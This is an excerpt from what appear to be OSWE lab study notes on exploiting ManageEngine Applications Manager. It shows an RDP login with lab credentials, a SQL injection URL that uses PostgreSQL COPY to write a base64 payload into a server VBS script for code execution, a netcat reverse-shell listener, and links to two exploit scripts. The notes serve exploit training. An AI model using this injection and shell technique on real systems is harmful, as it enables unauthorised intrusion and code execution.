...
The ManageEngine Applications Manager is an applicationthat is designed to monitor the performanceand uptime of critical applicationsin an organization’s infrastructure. This makes the server running this software a valuable target. The application can store sensitive information about other applications or the operating system may have cached credentials of a privileged user in the environment.

## Vulnerability Discovery
Connect to the remote server via rdp:

```bash
sudo rdesktop -u Administrator -p studentlab -g 90% -r disk:local="/home/kali/Desktop/" 192.168.125.113
```
...
Java web applications use a deployment descriptor file named **`web.xml`** under **`META-INF`** directory (which is the default configuration directory for Java apps) to determine how URLs map to servlets, which URLs require authentication, and other information.
...
4. **Write the payload to the target file system using the SQLI**
  ...
  - Final SQLI query looks like this (you might need to URL encode the value of the Base64 encoded payload):
    ```
    /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;copy (select convert_from(decode($$BASE64_ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
    ```
...
nc -nlvp 1337
  ```
**Exploitation Script:** https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ManageEngine/windows_rce.py
...
**Exploitaion Script:** https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ManageEngine/pg_lo_injection_rce.py
